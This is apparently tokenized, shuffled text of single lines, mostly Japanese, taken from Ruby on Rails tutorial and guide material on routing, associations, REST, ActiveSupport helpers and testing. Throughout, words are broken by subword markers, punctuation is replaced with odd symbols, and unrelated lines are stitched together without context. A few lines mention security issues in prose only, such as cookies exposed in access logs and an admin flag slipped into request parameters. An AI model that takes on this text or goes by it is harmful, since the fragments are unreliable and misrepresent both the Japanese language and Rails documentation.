▁ アプリケーションに カスタム CSS を追加する ための 第 一 段 階 として 、 カスタム CSS を 格 納 するための 以下の ファイル を開き ます 。
▁ ちなみに Ruby ▁ 2▖1 ▖ 5 のインストール にも 苦 戦 しました 。
▁ エンジンの コントローラ はデフォルトで ` Blorgh :: Application Controller ` を継承し ます 。
▁get ▁' こんにちは ', ▁controller : ▁' welcome ', ▁action : ▁' index '
▁< a ▁ href ="# " ▁on click =" this ▖ style ▖ backgroundColor =' # 99 0 000 ' "> P aint ▁it ▁red </ a >
▁ ページ の内容は 以下の とおり です 。
▁╼╼ %= ▁ lang : console ╼\ begin { code } ╼ $ ▁git ▁ checkout ▁- b ▁ filling - in - layout ╼\ end { code }╼╼ ▁\ subsection { ナビゲーション } ▁% ▁( fold )╼ ▁\ label { sec : adding _ to _ the _ layout }╼╼ As ▁a ▁first ▁step ▁toward ▁adding ▁links ▁and ▁style s ▁to ▁the ▁sample ▁application , ▁we ' ll
▁ 論 理 上 、 他の リソース の 配 下 に 子 リソース を 配置 することは よく あります 。
▁\ ref { sec : unsuccessful _ edit s } では 編集 フォームの 失敗 時 を実装 しました 。
▁=> ▁[" foo ", ▁" bar ", ▁" baz "]
▁` Date ▖ beginning _ of _ week ` または ` config ▖ beginning _ of _ week ` が設定され ていれば 、` next _ week ` と ` prev _ week ` は どちらも 正常に動作し ます 。
▁上のように することで 、 以下のような ` C ate g or ies ` コントローラ への ルーティング が 作成されます 。
▁<% ▁end ▁%>
▁もちろん 、 これらの レ ッ ス ン はすべて 通常の JavaScript にも 適用 できます 。
▁まずは いつものように 、 統合テスト を生成する ところから始め ます 。
▁ セッション 機能 ▁(\ ref { sec : sessions _ and _ failed _ signin }) ▁ を使用して 、 アカウントの有効化 という 作業を 「 リソース 」 として モデル 化 する ことにします ▟ アカウントの有効化 リソース は Active ▁Record の モデルと はこの 際 関係 ないので 、 両者 を 関連付け ること は しません 。
▁ ページの 数 よりも アクション の 数 の方 が多い ことに お 気 付き でしょうか ▟\ k ode { index }、\ k ode { show }、\ k ode { new }、\ k ode { edit } アクションは いずれも \ ref { sec : a _ user _ tour } の ページに 対応 しています が 、 それ 以外に も \ k ode { create }、\ k ode { update }、\ k ode { destroy } アクション があります 。
▁` has _ and _ belongs _ to _ many ` 関連付け に オブジェクトを ア サ イン し 、 しかも そのオブジェクト を 保存 したくない場合 、` collection ▖ build ` メソッド を使用してください 。
▁ 例 :
▁\ k ode { : name } と \ k ode { : email } 属性 のテスト 。
▁#### ▁` app ` ディレクトリ
▁ 具体的には 、\ k ode { get } ▁ と 書かれてい るため 、\ text tt { GET } ▁ リクエスト に対して 該当する アクションを 結 び つ け ています 。
▁また 、 { p 0} で紹介した {2} @ user ▖ reload {/2} を使って 、 データベースから 最新の ユーザー情報 を 読み込み 直 して 、 正しく 更新 された かどうかを確認 している 点 にも 注 目 してください 。
▁上の 最後の 手順 が 、 ユーザーログイン のとき の 手順 と 似 て いることにご注目ください ▟ ユーザーログイン では 、 メールアドレスを キー に して ユーザー を取り出し 、 送信された パスワードが パスワード ダイジェスト と 一致する ことを ▁(\ k ode { authenticate } メソッドで ) ▁ 確認し ます ▁( リスト \ ref { code : log _ in _ success }) 。
▁S ublime ▁Text を 再起動 すると 、 以下のような コマンド が Ruby Test パッケージ によって 提供され ます 。
▁ 既に \ ref { sec : bitbucket } で 一度 プッシュ を 行った ので 、 大 抵 の システム では \ k ode { git ▁push } を実行する ときに \ k ode { origin ▁master } を省略 できます 。
▁REST 理 論 そのもの は かなり 抽 象 的 ですが 、 Rails アプリケーション における REST とは 、 アプリケーション を構成する コンポーネント ▁( ユーザー や マイクロポスト など ) ▁ を 「\ emph { リソース }」 として モデル 化 すること を指します ▟ これらの リソース は 、 リ レ ー シ ョ ナ ル データベースの \ href { http :// en ▖ w ikipedia ▖ org / wiki / Create , _ read , _ update _ and _ delete } { 作成 / 読み 取り / 更新 / 削除 ▁( Create / Re ad / Update / Delete : ▁ CRUD ) ▁ 操作 } と 、 4 つの 基本的な \ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ request # Request _ methods } { HTTP ▁request メソッド } ▁(\ text tt { POST } / \ text tt { GET } / \ text tt { PUT } / \ text tt { DELETE }) ▁ の両方 に 対応 しています
▁{0} 図 12 ▖ 5 {/0} ▁{1} Home ページに ステータスフィード が表示され 、 フォロー の カウント が 1 増え た {/1}
▁\ emph { URI } は Uni form ▁Resource ▁I d ent if i er の 略 です ▟ それ より や や 一 般 性 の 低 い \ emph { URL } は Uni form ▁Resource ▁L o cat or の 略 です 。
▁\ k ode { user ▖ microposts ▖ build (▖▖▖) } という コードは 、 引数 で 与 え た ユーザーに 関連付け された マイクロポスト を返す
▁\ k ode { has \_ many ▁: through } を使うと 、 複雑な データ 関係 を モデリング できる
▁これらの ケース を まとめると 、 フォーム 変数 \ k ode { f } を \ k ode { f ▖ object } と する ことによって 、 関連付けられたオブジェクト にアクセス することができます ▟ したがって 、 以下のコード の場合
▁ 関連付けられたオブジェクト にも 自分の ` errors ` コレクション が含まれ るので 、 エラー は 呼び出し 元の モデル まで は 伝 わ り ません 。
▁\ emph { すべての } ユーザーに マイクロポストを 追加 しようとすると 時間 が 掛 か り 過 ぎ るので 、\ k ode { take } メソッドを使って 最初の 6 人 だけ に追加します 。
▁最初に マッチ した のが 以下の ルーティング だと します 。
▁ foo ▁: ▁bar
▁ サイクル の 記 念 すべき 第 一 歩 は About ページ 用の 失敗する テストを書く ことです 。
▁route ▁resources ▁: users
▁ 表 \ ref { table : demo _ RESTful _ users } の URL には 重複 している もの がある ことにご注目ください ▟ たとえば 、\ k ode { show } アクションと ▁\ k ode { update } アクションは 、 どちらも / users /1 という URL に 対応 しています 。
▁ただし 攻撃者は Web サーバー の アクセス ログ ファイル を調べ て 標的ユーザー の cookie を参照 することができます 。
▁続いて その テスト を実行して 「 失敗 」 する ことを確認 し 、 実際の アプリケーションコード を 書き ます 。
▁#### ▁` take `
▁* ▁` customers / _ customer ▖ html ▖ erb `
▁format ブロック 内で render メソッド呼び出し に ` layout : ▁' layout _ name ' ` オプションを 渡す ことで 、 フォーマット ごとに 異なる レイアウト を指定することもできます 。
▁no ▁changes ▁added ▁to ▁commit ▁( use ▁" git ▁add " ▁and / or ▁" git ▁commit ▁- a ")
▁TIP : ▁詳細については 、 production 環境 用 Web サーバー の ドキュメント を参照してください 。
▁これは 、 管理者 が システム から ユーザーを削除 した とき 、 持ち 主 の 存在しない マイクロポスト が データベースに 取り 残 されてしまう 問題 を 防 ぎ ます 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ r c 2 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁ 実際 、 Bootstrap フレームワーク では 、 多くの 色 に対して 変数 名を 定義 しています ▟ 定義されている 変数 は Bootstrap ページの 「\ href { http :// bootstrap docs ▖ com / v 2▖0▖ 4/ docs / less ▖ html } { LESS 変数 一覧 }」 で 参 照 することができます 。
▁さらに 申し上げ ると 、 この種の 永続的セッション を 手動で 確 認 するのは 非常に 面倒な ので 、\ k ode { current \_ user } を リファクタリング する のであれば ▁( {1} 第 {2} 10 {/2} 章 {/1} で 行う 予定です ) ▁ 同時に テスト も 作成 しておくこと が重要です 。
▁リスト \ ref { code : layout _ links _ test } で 追加 した 統合テスト が 通 る かどうか は 、 次のように Rake タスク を実行する ことで 試 す ことができます 。
▁ 技術 的に は 、 Rails は \ k ode { has \_ many } に 与えられた 引数 を 、\ k ode { classify } メソッドを使って クラス名 に変換 しています ▟ このメソッドは 、 たとえば \ k ode {" foo \_ bar s "} であれば \ k ode {" FooBar "} に変換 します 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / de le g ation ▖ rb ` です 。
▁to : ▁' static _ pages # contact ' ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁rails _ routes ▁( end )╼╼ ▁\ subsection { 名前付きルート } ▁% ▁( fold )╼ ▁\ label { sec : name d _ routes }╼╼
▁( Sass は \ ref { sec : sass } まで 登 場 しません が 、\ text tt { bootstrap - sass } ▁gem が動作する ための お ま じ ない として 必要です ) 。
▁" dude "▖ pluralize (2) ▁# ▁=> ▁" dude s "
▁### ▁ パッチ をテストする
▁ マイクロポストの 作成 に 失敗した場合 の エラーメッセージ
▁ 以上の 情報 を元に 、 PostgreSQL を使用して 開発 データベース と テスト データベース を作成し 、 それぞれ 設定 を行う ことが 、 この 課題 の ゴ ー ル です 。
▁これにより 、` config ▖ assets ▖ prefix ` で 指定された フォルダ が ` shared / assets ` に リンク されます 。
▁` BigDecimal ` の拡張
▁次の メソッドを使用すると 、 ミドルウェアスタック に 新しい ミドルウェア を追加する ことができます 。
▁M ac ▁OS ▁X や Windows には JavaScript ランタイム が 同 梱 されています 。
▁# ▁Defin es ▁the ▁matching ▁rules ▁for ▁Guard ▖
▁self を省略した 結果を リスト \ ref { code : curl _ rails _ png } に示します 。
▁ 正規表現 の 終わり を 示す
▁ サーバー と CDN の設定 完了 後 、 以下の アセット を持つ Web ページ にアクセス した とします 。
▁\ k ode { save } メソッドを 実行 した 後に 何 が変更され た のか を 確認し てみましょう 。
▁ レイアウト のリンク をテストする 統合テスト が追加された ことで 、 リンク に 間違った 変更 が 加 えられ たら すぐに 気 付ける ようになりました 。
▁ ジェネレータ を使用し たくない のであれば 、` app / job s ` の下に 自分で ジョブ ファイル を作成する こともできます ▟ ジョブ ファイル では 必ず ` ActiveJob :: Base ` を継承し てください 。
▁ 一 方 、\ k ode { cookies } メソッド ▁(\ ref { sec : remember _ me }) ▁ の場合は 、\ k ode { session } メソッドで 作成された 一時 cookies は 、 ブラウザを閉じ た 瞬 間 に 有効期限 が 終 了 します 。
▁ head ▁: created , ▁location : ▁ photo _ path (@ photo )
▁ ex abytes
▁この コールバック がある ことで 、( リスト { p 0} で ユーザー登録 を 行った ときに ) {2} User ▖ new {/2} で 新しい ユーザーが 定義され ると 、 {2} activation _ token {/2} 属性 や {2} activation _ digest {/2} 属性 を自動的に 得られます ▟ 後者の activation _ digest 属性 は既に データベースの カラム と の関連付け が でき あ が っている ▁( 図 \ ref { fig : user _ model _ account _ activation }) ▁ ので 、 ユーザーが 保存 される ときに 一 緒 に 自動 保存されます 。
▁この コレクション を 作る ために 、 以下の コンソール セッション に示した ような 、 文字列 の配列 を簡単に 作 れる \ k ode { % w [ ]} という 便利な テクニック を 知 っ ておく と 良い でしょう 。
▁これは ライブラリ において は 特に 重要な 問題 です 。
▁Rails ▁ 2▖1 ▖ 2 では これらの 文字 を ` redirect _ to ` メソッドの Location フィールド から エスケープ する ようになりました 。
▁ それらの 章では 、 Rails の 強力な 機能 ▁( 画像アップロード 、 カスタム の データベース クエリ 、\ k ode { has \_ many } や \ k ode { has \_ many ▁: through } を使用した 高度な データベース モデリング など ) ▁ を 多数 紹 介 する 予定です 。
▁( このコード のテスト は \ ref { sec : exercises _ friendly _ forwarding } の演習 とします ) 。
▁To y アプリケーション 用の \ k ode { Gemfile }
▁# ▁If ▁you ' re ▁not ▁using ▁ActiveRecord , ▁or ▁you ' d ▁prefer ▁not ▁to ▁run ▁each ▁of
▁この コマンド を実行すると 、 先ほど 定義 した ユーザー と マイクロポストの データモデル を使って 、 Heroku 上の データベース が更新され ます 。
▁Active ▁Record を使用することで 、 SQL を 直 に 実行する 必要 は ほぼ なくなります 。
▁2▖ ordinal ▁# ▁=> ▁" nd "
▁# ▁I gnore ▁ bundler ▁config ▖
▁ デフォルトの ミドルウェア ( と その 他 のうち いくつか ) については ▁[ In ter n al ▁ Middleware s ](# ミドルウェアスタック の内容 ) ▁ を参照してください 。
▁now ▖ change ( m in : ▁0 )
▁これ から 5 つの 章 を通して 、 ユーザー登録ページ を 作 って い く ことにしましょう 。
▁sign _ out
▁ここでは \ k ode { to } メソッドを使用して 、 正しい データ を与え て ユーザー登録 ボタン を 押 したときに カウント が 1 つ \ emph { 増え る } ことを確認します 。
▁ 変更 が 特定の issue に関連する 場合は 、 issue 番号 も 記 入 してください 。
▁上の 最後の 手順 が 、 ユーザーログイン のとき の 手順 と 似 て いることにご注目ください ▟ ユーザーログイン では 、 メールアドレスを キー に して ユーザー を取り出し 、 送信された パスワードが パスワード ダイジェスト と 一致する ことを ▁(\ k ode { authenticate } メソッドで ) ▁ 確認し ます ▁( リスト \ ref { code : find _ authenticate _ user }) 。
▁ このテストは 最初の メールアドレス の 重複 テスト と同じ ことを しています が 、 大文字 に変換 した メールアドレス を使っている 点 が異なります 。
▁この よう になっている のは 、 testing 環境 が その ように 設定 されている ためです ▟ エンジンの 主要な 機能 、 特に コントローラ をテストする には 、 エンジン を ホスト する アプリケーション が必要です 。
▁ サンプルアプリケーションの 他の 機能 と同様 、 User モデル への 検証 の 追加 も テスト駆動開発 ▁( TDD ) ▁ で 行います 。
▁### ▁` strip _ her e doc `
▁person ▖ errors ▖ size ▁# ▁=> ▁2
▁ 新しい ターミナル タブ を開く 。
▁ ビュー を作成するとき は 、 ページの 構造 が 正 確 である かどうか よりも ページの 外 観 の方 を 重要 視 する のが 普通 なので 、 少なくとも 今は ビュー をテストする 必要はありません 。
▁ 理由 が あって プラグイン を gem に しない のであれば 、 プラグイン を ` lib / my _ plugin /* ` に移動し 、 適切な 初期化 の 記 述 を ` config / initializers / my _ plugin ▖ rb ` に 書 い てください 。
▁また 、 最初に 無効な パスワード 、 次に 有効な パスワード を与える ことで \ k ode { authenticate } の動作 を確認する こともできます 。
▁Time ▖ local (200 0, ▁10 , ▁31)▖ prev _ quarter ▁# ▁=> ▁Mon , ▁30 ▁Oct ▁2000
▁ RE presentational ▁ State ▁ Transfer ▁( REST )
▁has _ many ▁: orders , ▁-> ▁ { ▁order ▁" date _ confirmed ▁DESC " ▁ }
▁ 話 を 戻 して 、 Bootstrap の 変数 の 一覧 表 を見ると 、 薄 い 灰 色 に対して 以下の 変数 名 が与えられ ること に 気 が 付き ます 。
▁The ▁\ k ode { current _ user ?}
▁Rails の場合 、 組み込み クラスの 変更を 正 当 化 できる 理由 がいくつも あります ▟ たとえば 、 Web ▁ アプリケーションでは 、 変数 が 絶対に \ emph { 空白 } にならない ように した くなる ことが よく あります ▁( ユーザー名 など は スペース や \ href { http :// en ▖ w ikipedia ▖ org / wiki / W h ite space _ ( computer _ science )} { その他の 空白 文字 } になって 欲 しく ない ものです ) ▁ ので 、 Rails は \ k ode { blank ?} メソッドを Ruby ▁ に追加し ています 。
▁Client ▖ where ( first _ name : ▁' does ▁not ▁exist ')▖ take !
▁ リレーションシップ の作成 と 属性 をテストする 。
▁Rails には 、 ジェネレータ という 多数の スクリプト が 付 属 し ており 、 これら が 特定の タスク を開始 するために必要な もの を自動的に 作り 出 してくれる ので 、 開発 が 容易に なります 。
▁ できる か ぎ り 、 データベースの 内部 エンコード は UT F -8 に しておいてください 。
▁ PUT ▁ / articles / : id (▖ : format ) ▁articles # update
▁Date ▖ new (200 0, ▁5 , ▁31)▖ next _ month ▁# ▁=> ▁Fri , ▁30 ▁Jun ▁2000
▁> > ▁p ▁= ▁Person ▖ create
▁#### ▁ コレクション パーシャル レイアウト
▁この 攻 撃 は 2006 年 6 月 11 日 に 行われた もの で 、 Web メール インターフェイス を使用する ワーム の最初の 事例 です 。
▁* ▁` action _ controller ▖ initialize _ framework _ cache s `: ▁` Rails ▖ cache ` に対する 設定 が行われていない 場合に ` ActionController :: Base ▖ cache _ store ` を設定します 。
▁* ▁` config ▖ action _ view ▖ field _ error _ proc ` は 、 Active ▁Record で 発生 した エラー の表示 に使用する HTML ジェネレータ を指定します 。
▁\ ref { sec : user _ validations } と同様 で 、 リスト \ ref { code : micropost _ validations _ tests } では マイクロポスト の長さ をテストするために 、 文字列 の 乗 算 を使用しています 。
▁作成した コードをリスト \ ref { code : user _ model _ activation _ code } に示します
▁\ emph { Ruby ▁on ▁Rails チュートリアル } 第 3 版 では 、 Rails を 学 び やすくするため に さまざまな 工 夫 を こ ら しました 。
▁この 方が 、 コードの 重複 を 一 括 で 取り 除 け る からです 。
▁1 番目 は \ k ode { edit } アクションと ▁\ k ode { update } アクション の両方 で 対応する 必要がある ため 、 論 理 的に は before フィルタ で 行う べ き です ▁( リスト \ ref { code : password _ reset _ update _ action }) 。
▁render ▁action : ▁" regular _ show "
▁\ href { http :// rack ▖ ruby for ge ▖ org / doc /}{ Rack ミドルウェア } 用の 設定ファイル
▁TIP : ▁`: foreign _ key ` オプション および `: association _ foreign _ key ` オプションは 、 多 対 多 の 自 己 結合 を 行いたい ときに 便利です 。
▁ オプション については 、1 つ 上の [ 計算 ](# 計算 ) セクション を参照してください 。
▁Rails 開発者 にとって は 、 RESTful な スタイル を採用する ことで 、 作成 すべき コントローラ や アクション の 決定 が 楽 になります ▟ 作成 ( C ) ・ 読み 取り ( R ) ・ 更新 ( U ) ・ 削除 ( D ) を行う リソース だけで アプリケーション 全体 を 構成 してしまう こと すら 可能です 。
▁ この後 にも 続 々 同じ ような 動 画 が 作 ら れ ています が 、 いずれも Rails の 能 力 の 一 端 を 垣 間 見 る には う って つ け なので 、 ぜ ひ 一度 ご 覧 ください 。
▁ s ting }╼╼\ subsection { 本番環境で の 画像アップロード } ▁% ▁( fold )╼\ label { sec : image _ upload _ in _ production }╼╼
▁" M :: X "▖ constantize ▁# ▁=> ▁1
▁ 前 章 同様に 、 トピックブランチ で 作業 してから 、 最後に 更新 を マージ します 。
▁ 以下のような コードの 書き 方 を 強く 推 奨 します 。
▁NOTE : ▁` ActionDispatch :: Middleware Stack ` は ` Rack :: Builder ` の Rails 版 ですが 、 Rails アプリケーションの 要求 を 満 た す ために 、 より 柔 軟 性 があり 、 多 機能 な クラス になっています 。
▁<% ▁@ article ▖ errors ▖ full _ messages ▖ each ▁do ▁| msg | ▁%>
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / compact ▖ rb ` です 。
▁date _ field (" user ", ▁" d ob ")
▁end
▁ 本 サイトに ユーザー登録 い ただ き あり が と う ご ざ います 。
▁@ x , ▁@ y ▁= ▁x , ▁ y
▁| public / | この フォルダ の下に ある ファイルは 外部 ▁( イン ター ネ ッ ト ) ▁ から そのまま 参 照 できます 。
▁ イン ター セ プ タ が動作する ように するには 、 Action ▁Mailer フレームワーク に 登録 する必要があります 。
▁" invoice _ lines "▖ classify ▁# ▁=> ▁" Invoice L in e "
▁( 注 : ▁ 執 筆 作業 軽 減 の ため 、 今後 は RSpec の 出力結果 を 掲 載 しません ▟ 画面 表示 の内容は システム によって 大きく 異なる う え 、 各 段階で の 出力 画面 数を 把 握 して メ ン テ ナ ン ス し 続ける のが 極めて 困難 な ためです ▟ ご 了 承 ください ▟)
▁#### ▁index ファイル を使用する
▁{0} 図 10 ▖ 11 {/0} {1} 新しいマイクロポスト フォーム のある Home ページ ▁(\ href { http :// localhost :3000/}{/}) ▟\ href { http :// railstutorial ▖ org / images / figures / home _ with _ form _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Microposts リソース の 説明 が 終わり ました ので 、 ここで リポジトリを GitHub に 登録 しましょう 。
▁このメソッド には `: remote ` オプション があり 、 以下のように 使用できます 。
▁ 一般的な ブログ と同様 、 この ブログ の 記事 を 読 んだ 人 は そこに 直接 コメント を追加した くなる でしょう ▟ そして コメント を追加 後に 元の 記事 表示 ページに 戻 り 、 コメント が そこに 反映され ている ことを確認 したい はずです 。
▁resources ▁: photos , ▁: account s
▁# ▁=> ▁{" " ▁=> ▁nil , ▁" A " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁NOTE : ▁この リソース へのパス を生成する には ` photos _ path ` や ` new _ photo _ path ` など を使用してください 。
▁<%= ▁link _ to ▁' Edit ▁A d ', ▁ [: edit , ▁@ magazine , ▁@ ad ] ▁%>
▁ 特に 、\ emph { クラス } の 概念 ▁(\ ref { sec : ruby _ classes } で 解説します ) ▁ に 慣 れ ていない 方は 、 後で この節 を もう一度 読み 返す ことを お す す め いた します 。
▁+ - --- +-------------+ - - -------- + --- --- + --------------- +
▁ セッション 関連の ミドルウェア を削除し たい ときは 次のように 書き ます 。
▁ それ以外の 追加 は 不要 です 。
▁この 「 The ▁Rails ▁Way 」 、「 Rails 流 」 と でも い う べ き 手法 を 学 んだ 人 は 、 開発 の 生 産 性 が 著 しく 向上 する ことに気付く でしょう 。
▁# ▁=> ▁< input ▁type =" url " ▁id =" user _ url " ▁name =" user [ url ] " ▁value ="# {@ user ▖ url } " ▁/>
▁12345678▖ to _ s (: delimited , ▁ delimiter : ▁ "▖" )
▁" name "▖ dasherize ▁# ▁=> ▁" name "
▁ これまで クラス や 継 承 について 説明 して きました が 、 これらの 話 は 前の 章 にも あった ような 気 が します ▟ { それ も その は ず で 、 StaticPages コントローラで 継 承 や クラス について 触れ た こと があり ました ▁( リスト \ ref { code : adding _ the _ about _ page }) 。
▁" To m ▁& ▁ J er ry "▖ to _ param ▁# ▁=> ▁" To m ▁& ▁ J er ry "
▁# ▁Ruby ▁on ▁Rails ▁ チュートリアル : サンプルアプリケーション
▁Rails では 複数の テンプレート システム が サポート されており 、 テンプレート ファイルの 拡張子 で 区別 されます 。
▁デフォルトでは ルート ノード は " hash " ですが 、`: root ` オプション を使用して カスタマイズ できます 。
▁ 変更 をデータベースに保存する ために 最後に save を実行する 必要がある ことを 忘れ ないでください 。
▁ 旧 版 チュートリアル で 依 存 して いた 多くの 外部 ライブラリ ▁( RSpec 、 Cucumber 、 Capybara 、 Factory ▁Girl ) ▁ を 廃 止 しました 。
▁ユーザーの フォロー に対するテスト では 、 ▁ / relationships に対して POST リクエストを 送 り 、 フォロー された ユーザーが 1 人 増え た ことを チェック します ▟ 具体的な コード は次のとおりです 。
▁また 、 そのような 値 を持つ グループ は 、 常に 全体 の中で 最後の グループ になります 。
▁なお 、 以前の バージョン では ` Hash With I ndifferentAccess ` が使用され ていました 。
▁ユーザーの ア ン フォローする フォーム
▁デフォルトは false です 。
▁ この時点では もちろん 実装 はありません が 、 機能 を確認する ための テストは 作成 できます 。
▁この節では 、 レイアウト と ルーティング の 取り 組み における 頂 点 として 、 ユーザー登録ページ への ルーティング を作成します ▟ そのために 2 番目の コントローラ を作成する ことになります 。
▁以下の 情報を 参考にしてください 。
▁\ k ode { admin = ’ 1 ’} という 値を \ k ode { params [: user ]} の一部 に 紛 れ 込 ま せ て 渡 して しま えば 、 この 属性を \ k ode { true } に することができます ▟ これは \ text tt { curl } などの コマンド ベースの HTTP クライアント を使用すれば 簡単に 行う ことができます 。
▁#### ▁` belongs _ to ` の スコープ
▁< small > B y ▁<%= ▁article ▖ author ▁%></ small >
▁` content _ for ` を呼び出す と 、 後 の 利用 に 備えて 、 id に対応する マークアップ の ブロック が 保存されます 。
▁次に \ k ode { first _ app } という 最初の ▁Rails ▁ アプリ の作成 に 着 手 します 。
▁ 現在 は 、 他の スコープ と同様 、 マージ される ようになりました 。
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5 ▁O F F SE T ▁30
▁* ▁` update _ attribute `
▁ タイトル に Ruby を 埋 め 込 んだ Home ページのビュー
▁> > ▁Rails ▖ env ▖ development ?
▁ そう なる と 大量の スタック ト レ ー ス が 出力 されて 非常に 不 便 です ▟ gem の 依存関係 を調べ ているので も なければ 、 開発 している アプリケーションで 問題 の 原 因 を 追 跡 中に 大量の メッセージ が 出力 されて も 、 邪 魔 な だけです 。
▁config ▖ action _ mailer ▖ perform _ deliveries ▁= ▁true
▁* ▁` config ▖ color ize _ logging ` は 、 出力する ログ 情報 に A N S I 色 情報 を与える かどうかを指定します 。
▁\ ref { sec : database _ migrations } で 、 User モデル を生成する と 自動的に 新しい マイグレーション が 作成された ことを思い出してください ▁( リスト \ ref { code : users _ migration })▟ 今回の 場合は 、 既に 存在する モデルに 構造 を追加する ので 、 以下のように \ k ode { migration } ジェネレータ ー を使用して マイグレーション を直接 作成 する必要があります 。
▁ 顧客 と 注文 を設定する コードを 次のように 書き 直 します 。
▁そこで \ k ode { before \_ create } コールバック が必要 になります ▟ この コールバック は以下のように 定義 できます 。
▁2 つの モデルを 多 対 多 で 結合 する 結合テーブル で このような 複雑な 振る舞い が必要になる のであれば 、` has _ and _ belongs _ to _ many ` ではなく ` has _ many ▁: through ` を使用してください 。
▁module ▁X
▁[ S te ve ▁So u d ers の ブログ 記事 ]( http :// www ▖ s te ve so u d ers ▖ com / blog / 2008 / 08 / 23 / re v v ing - filename s - do nt - use - query string / ) による と 、「 キャッシュ される 可能性のある リソース に クエリ 文字列 で アクセス するのは 避ける こと 」 が 推 奨 されています 。
▁ 新規 記事 投 稿 フォーム ]( images / getting _ started / new _ article ▖ png )
▁上の 変更 を確認する ためには 、 テスト 時に 登録 済み ユーザー として ログイン しておく必要があります ▟ 当 然 ながら 、 データベースに そのため の ユーザーが 登録 されて い なければなりません 。
▁{0} 図 12 ▖ 16 {/0} ▁{1} 現在のユーザー に フォロー されている ユーザー を表示する {/1}
▁self を省略した 結果を リスト \ ref { code : following _ followers _ authorization _ test } に示します 。
▁" hello "▖ to (2) ▁# ▁=> ▁" h el "
▁ foo @ bar _ baz ▖ com ▁ foo @ bar + baz ▖ com ]
▁たとえば 、 ひ と か た まり の レコード を取り出し 、 それを テーブル 内の ` created _ at ` の 昇 順 で 並 べ たい場合 には 以下のように します 。
▁* ▁`: destroy ` を指定すると 、 関連付けられたオブジェクト も 同時に destroy されます 。
▁* ▁ その他の 場合 、` key ` を 持ち 、 ノード が タグ として 作成されます ▟ その ノード には ` value ` を 文字列 形式 にした もの が テキスト ノード として 追加 されます 。
▁これらの アセットを 必要 と するのは 、 gem の admin レイアウト しか ない からです 。
▁t ▖ string ▁: name
▁ コントローラの ビュー と同様に 、` yield ` を使用して レイアウト 内の ビューを レンダリング できます 。
▁ 前述の ように \ k ode { current \_ user } ヘルパー を定義する と 、 リスト \ ref { code : persistent _ current _ user } のようになります 。
▁\ href { http :// guides ▖ rubyonrails ▖ org /}{ Rails ガイド } : ▁ トピック 毎 に 分 類 された 最新の Rails リ フ ァ レ ン ス です ▁( 訳 注 : ▁Rails G u ide s の 日本語 版 を 「 Rails ガイド 」 と 呼んでいます ▟)
▁ 本番環境 の Web サーバー 設定ファイル
▁* ▁` action _ mailer ▖ logger `: ▁` Rails ▖ logger ` に対する 設定 が行われていない 場合に ` ActionMailer :: Base ▖ logger ` を設定します 。
▁* ▁` ActiveRecord :: Query Cache ` は 、 リクエスト によって 生成された すべての SELECT クエリ を キャッシュ します 。
▁ 関連付け は きわめて 便利です が 、 残念ながら 全 自動 の 魔 法 ではありません 。
▁ ログアウト 用 リンク は リスト \ ref { code : layout _ login _ logout _ links } で 既に 作成 済み なので 、 ユーザー セッション を破棄する ための 有効な アクションを コントローラで 作成する だけで済みます 。
▁ せっかく なので 、 自分の プルリクエスト への 反 応 を 待 っている 間 に 、 他の 人 の プルリクエスト を開いて コメント してみましょう 。
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁nil } ▖ compact ▁# ▁=> ▁ { a : ▁1, ▁b : ▁2 }
▁ 本ガイド の 前 提 条件
▁# ▁validates ▁: name , ▁presence : ▁true
▁<%= ▁stylesheet _ link _ tag ▁" layout " ▁%>
▁* ▁` config ▖ session _ store ` は 、 通常 は ` config / initializers / session _ store ▖ rb ` で 設定 される もの であり 、 セッション を保存する クラス を指定します 。
▁* ▁ 双 方 向 関連付け
▁`: instance _ reader ` オプションを ` false ` に設定する ことで 、 reader インスタンス メソッド が生成され ない ように できます ▟ 同様に 、`: instance _ writer ` オプションを ` false ` に設定する ことで 、 writer インスタンス メソッド が生成され ない ように できます 。
▁Rails ▁ 3▖0 から Rails ▁3▖1 へのアップグレード
▁0 から 59 まで の 秒 を オプション に 持ち 、 現在 時刻 の 秒 が 選択 されている select タグを返します 。
▁* ▁`: source `
▁ コールバック の詳細については [ Active ▁Record コールバック ガイド ]( active _ record _ callback s ▖ html ) を参照してください 。
▁@ railstutorial jp ▁ で Ruby ▁on ▁Rails を 学習 中 !
▁Rails の RESTful 構造 を 身 体 に 叩 き こ む には 、 繰り返し 学ぶ のが 一番 です ▟ Users リソース と Microposts リソース の 構造 の 類似 点 を理解する ことが 、 この章 の 主要な 目的 です
▁` * _ path ` ヘルパーは 、 動作 の 性 質 上 メール 内で は 一 切 使用 できない 点にご注意ください 。
▁Oh ▁ de a ▖▖▖"
▁` <%= ▁render ▁@ article ▖ comments ▁%> ` 呼び出し によって ` comment _ counter ` ローカル変数 が返されます ▟ この 変数 は自動的に 定義され 、 コメント を it er ate する たびに カウント アップ します 。
▁* ▁` geocoder _ path ` は ` / geocoder ` を返します 。
▁password : ▁' < パスワード > ',
▁ 12345 ▖ to _ s (: human ) ▁# ▁=> ▁" 12 ▖ 3 ▁T housand "
▁作成した コードをリスト \ ref { code : successful _ edit _ test } に示します
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test ▖ rb
▁1234567890 123 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁T r illion "
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / attr _ internal ▖ rb ` です 。
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁defaults : ▁ { ▁format : ▁' jpg ' ▁ }
▁#### ▁` in _ groups _ of ( number , ▁fill _ with ▁= ▁nil ) `
▁ ユーザー一覧ページ へのリンク を更新する
